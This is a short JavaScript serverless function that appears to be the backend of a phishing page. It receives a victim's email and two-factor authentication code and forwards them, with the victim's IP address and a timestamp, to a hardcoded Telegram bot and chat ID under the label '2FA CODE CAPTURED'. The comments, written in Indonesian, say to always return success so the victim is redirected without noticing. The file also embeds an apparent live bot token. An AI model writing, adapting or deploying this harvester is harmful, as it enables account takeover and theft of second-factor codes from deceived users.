module.exports = async (req, res) => {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle OPTIONS preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method === 'POST') {
    try {
      const { email, code } = req.body;
      
      // ================================
      // ✅ TOKEN & CHAT ID SUDAH BENAR
      const botToken = "8288645874:AAHXwc49sz8HwK7_JGIBUWEiYGpZJebg5kQ";
      const chatId = "8358778598"; // CHAT ID TUAN AGUNG
      // ================================
      
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
      const time = new Date().toLocaleString('id-ID');
      
      const message = `🔐 **2FA CODE CAPTURED**\n\n📧 Email: ${email || 'No email'}\n🔢 Code: ${code}\n🌐 IP: ${ip}\n⏰ Time: ${time}`;
      
      console.log(`📤 Sending to Telegram: ${email} - ${code}`);
      
      // Kirim ke Telegram
      const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      });
      
      const telegramData = await telegramResponse.json();
      console.log('📩 Telegram API Response:', telegramData);
      
      if (telegramData.ok) {
        console.log(`✅ BERHASIL: 2FA sent to Telegram - ${email}`);
        return res.status(200).json({ 
          success: true, 
          message: 'Code sent to Telegram',
          telegram_id: telegramData.result.message_id
        });
      } else {
        console.error('❌ Telegram Error:', telegramData);
        // Tetap return success agar user redirect
        return res.status(200).json({ 
          success: true, 
          warning: 'Telegram failed but continuing',
          error: telegramData.description
        });
      }
      
    } catch (error) {
      console.error('🔥 Server Error:', error);
      // Tetap return success meski error
      return res.status(200).json({ 
        success: true, 
        warning: 'Server error but continuing',
        error: error.message
      });
    }
  }
  
  return res.status(405).json({ 
    success: false, 
    error: 'Method not allowed' 
  });
};
